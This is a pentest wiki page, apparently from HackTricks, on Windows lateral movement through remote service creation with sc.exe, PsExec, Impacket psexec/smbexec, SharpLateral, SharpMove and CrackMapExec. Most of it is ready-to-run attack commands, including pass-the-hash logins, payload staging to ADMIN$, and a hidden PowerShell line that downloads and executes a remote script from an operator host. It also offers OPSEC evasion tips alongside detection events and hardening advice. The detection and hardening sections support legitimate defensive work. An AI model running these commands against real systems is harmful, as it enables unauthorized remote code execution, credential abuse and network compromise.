# Remote Service Execution (PsExec, WinExec, ScExec, SMBExec, SCMExec)

{{#include ../../banners/hacktricks-training.md}}

## How do they work

These techniques abuse the Windows Service Control Manager (SCM) remotely over SMB/RPC to execute commands on a target host. The Service Control Manager Remote Protocol (SCMR) is the RPC-based interface for configuring and controlling Windows services on a remote computer. With sufficient permissions, an operator can create or reconfigure a service whose binary path contains a command and then start that service to execute it remotely.<sup>[[5]](#references)</sup> The common flow is:

1. Authenticate to the target over SMB/RPC (TCP/445); access the ADMIN$ share when the chosen variant needs to stage a file or retrieve output there.
2. Copy an executable or specify a LOLBAS command line that the service will run.
3. Create a service remotely via SCM (MS-SCMR over \PIPE\svcctl) pointing to that command or binary.
4. Start the service to execute the payload and optionally capture stdin/stdout via a named pipe.
5. Stop the service and clean up (delete the service and any dropped binaries).

Requirements/prereqs:
- Local Administrator on the target (SeCreateServicePrivilege) or explicit service creation rights on the target.
- SMB (445) reachable and Remote Service Management allowed through the host firewall; ADMIN$ must be available for variants that use it to stage a file or retrieve output.
- UAC Remote Restrictions: with local accounts, token filtering may block admin over the network unless using the built-in Administrator or LocalAccountTokenFilterPolicy=1.
- Kerberos vs NTLM: using a hostname/FQDN enables Kerberos; connecting by IP often falls back to NTLM (and may be blocked in hardened environments).

If no service account is specified, `CreateService` uses `LocalSystem`, which has extensive local privileges. This explains the high impact of successful SCM execution. It does not inherently disable UAC or Microsoft Defender: the caller still needs remote SCM rights, and endpoint controls can inspect or block the service or payload.<sup>[[7]](#references)</sup><sup>[[8]](#references)</sup>

### Manual ScExec/WinExec via sc.exe

The following shows a minimal service-creation approach. The service image can be a dropped EXE or a LOLBAS like cmd.exe or powershell.exe.

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

Notes:
- Expect a timeout error when starting a non-service EXE; execution still happens.
- To remain more OPSEC-friendly, prefer fileless commands (cmd /c, powershell -enc) or delete dropped artifacts.

Find more detailed steps in: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Tooling and examples

### Sysinternals PsExec.exe

- Classic admin tool that uses SMB to drop PSEXESVC.exe in ADMIN$, installs a temporary service (default name PSEXESVC), and proxies I/O over named pipes.
- Example usages:<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- You can launch directly from Sysinternals Live via WebDAV:

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- Leaves service install/uninstall events (Service name often PSEXESVC unless -r is used) and creates C:\Windows\PSEXESVC.exe during execution.

### Impacket psexec.py (PsExec-like)

- Uses an embedded RemCom-like service. Drops a transient service binary (commonly randomized name) via ADMIN$, creates a service (default often RemComSvc), and proxies I/O over a named pipe.

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

On Kali, the Impacket examples may be located under `/usr/share/doc/python3-impacket/examples/`. If no password is provided, the tool prompts for one. Impacket's `-k` requests Kerberos authentication instead of NTLM, usually using the current credential cache or supplied credentials.

```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p '<password>' # Sysinternals PsExec password authentication
```

Artifacts
- Temporary EXE in C:\Windows\ (random 8 chars). Service name defaults to RemComSvc unless overridden.

### Impacket smbexec.py (SMBExec)

- Creates a temporary service that spawns cmd.exe and uses a named pipe for I/O. Generally avoids dropping a full EXE payload; command execution is semi-interactive.

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implements several lateral movement methods including service-based exec.

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove) supports authenticated remote execution through SCM and several other Windows mechanisms, including service modification/creation.

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- You can also use CrackMapExec to execute via different backends (psexec/smbexec/wmiexec):

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

#### SCMExec with SharpMove

The SCM action creates a service named `WindowsDebug` and points it at a payload already present on the remote host.<sup>[[6]](#references)</sup>

```powershell
SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true
```

## OPSEC, detection and artifacts

Typical host/network artifacts when using PsExec-like techniques:
- Security 4624 (Logon Type 3) and 4672 (Special Privileges) on target for the admin account used.
- Security 5140/5145 File Share and File Share Detailed events showing ADMIN$ access and create/write of service binaries (e.g., PSEXESVC.exe or random 8-char .exe).
- **System** 7045 from Service Control Manager for service installation on the target: names like PSEXESVC, RemComSvc, or custom (`-r` / `-service-name`). This proves a service was installed, not that its image ran. Correlate its timestamp and image path with process events or a matching service-image prefetch entry when available.<sup>[[4]](#references)</sup>
- Sysmon 1 (Process Create) for services.exe or the service image, 3 (Network Connect), 11 (File Create) in C:\Windows\, 17/18 (Pipe Created/Connected) for pipes such as \\.\pipe\psexesvc, \\.\pipe\remcom_*, or randomized equivalents.
- Registry artifact for Sysinternals EULA: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 on the operator host (if not suppressed).

Hunting ideas
- Alert on service installs where the ImagePath includes cmd.exe /c, powershell.exe, or TEMP locations.
- Look for process creations where ParentImage is C:\Windows\PSEXESVC.exe or children of services.exe running as LOCAL SYSTEM executing shells.
- Flag named pipes ending with -stdin/-stdout/-stderr or well-known PsExec clone pipe names.

## Troubleshooting common failures
- Access is denied (5) when creating services: not truly local admin, UAC remote restrictions for local accounts, or EDR tampering protection on the service binary path.
- The network path was not found (53) or could not connect to ADMIN$: firewall blocking SMB/RPC or admin shares disabled.
- Kerberos fails but NTLM is blocked: connect using hostname/FQDN (not IP), ensure proper SPNs, or supply -k/-no-pass with tickets when using Impacket.
- Service start times out but payload ran: expected if not a real service binary; capture output to a file or use smbexec for live I/O.

## Hardening notes
- Windows 11 24H2 and Windows Server 2025 require SMB signing by default for outbound (and Windows 11 inbound) connections. This does not break legitimate PsExec usage with valid creds but prevents unsigned SMB relay abuse and may impact devices that don’t support signing.<sup>[[2]](#references)</sup>
- New SMB client NTLM blocking (Windows 11 24H2/Server 2025) can prevent NTLM fallback when connecting by IP or to non-Kerberos servers. In hardened environments this will break NTLM-based PsExec/SMBExec; use Kerberos (hostname/FQDN) or configure exceptions if legitimately needed.<sup>[[2]](#references)</sup>
- Principle of least privilege: minimize local admin membership, prefer Just-in-Time/Just-Enough Admin, enforce LAPS, and monitor/alert on 7045 service installs.

## See also

- WMI-based remote exec (often more fileless):

{{#ref}}
./wmiexec.md
{{#endref}}

- WinRM-based remote exec:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [SMB security hardening in Windows Server 2025 & Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Using Credentials to Own Windows Boxes - Part 2 (PSExec and Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – Troubleshoot unexpected reboots using system event logs](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
- [5] [Microsoft Open Specifications - Service Control Manager Remote Protocol overview](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/d5bd5712-fa64-44bf-9433-3651f6a5ce97)
- [6] [GitHub - SharpMove](https://github.com/0xthirteen/SharpMove)
- [7] [Microsoft Learn - LocalSystem account](https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account)
- [8] [Microsoft Learn - `CreateService` function](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)

{{#include ../../banners/hacktricks-training.md}}
